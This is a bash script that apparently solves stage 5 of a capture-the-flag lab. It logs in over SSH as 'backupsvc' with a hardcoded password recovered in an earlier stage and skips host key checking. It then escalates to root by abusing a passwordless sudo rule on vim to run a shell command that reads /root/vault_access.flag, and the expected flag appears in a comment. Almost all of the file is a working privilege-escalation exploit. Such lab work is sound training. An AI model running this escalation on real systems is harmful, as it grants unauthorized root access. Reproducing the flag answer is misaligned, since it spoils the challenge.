#!/usr/bin/env bash
# Stage 5 solver - SSH in and escalate via the NOPASSWD sudo vim rule (GTFOBins)
# Usage: ./stage5_linux.sh [host] [port]
HOST="${1:-localhost}"; PORT="${2:-2222}"
USER=backupsvc; PASS='Backup123!'   # password recovered in Stage 1
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p "$PORT" "$USER@$HOST" \
  "sudo vim -es -c ':!cat /root/vault_access.flag' -c ':q!'"
# -> ROGUE{s0_th4ts_h0w_h3_did_it}
